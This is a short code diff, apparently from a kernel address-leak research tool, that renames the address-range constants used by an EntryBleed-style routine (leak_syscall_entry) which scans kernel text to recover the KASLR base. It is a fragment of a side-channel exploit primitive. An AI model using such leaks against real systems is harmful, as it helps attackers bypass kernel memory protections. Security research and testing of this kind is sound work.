@@ -181,7 +181,7 @@ static int detect_kernel_version(void) {
 
 #define STEP 0x100000ul
 #define ARR_SIZE                                                               \
-  (unsigned long)((KERNEL_VIRT_TEXT_MAX - KERNEL_VIRT_TEXT_MIN) / STEP)
+  (unsigned long)((VIRT_TEXT_PLAUSIBLE_MAX - VIRT_TEXT_PLAUSIBLE_MIN) / STEP)
 
 /* Passes for the majority vote over leak_syscall_entry(). A vulnerable system
  * agrees on the base across most passes; an odd budget lets a clear majority
@@ -194,7 +194,7 @@ static int debug_mode; /* KASLD_ENTRYBLEED_DEBUG: the whole slot profile */
 static uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
   uint64_t min = ~0, addr = ~0;
-  uint64_t SCAN_START = KERNEL_VIRT_TEXT_MIN + offset;
+  uint64_t SCAN_START = VIRT_TEXT_PLAUSIBLE_MIN + offset;
 
   int iterations = 100;
   int dummy_iterations = 5;
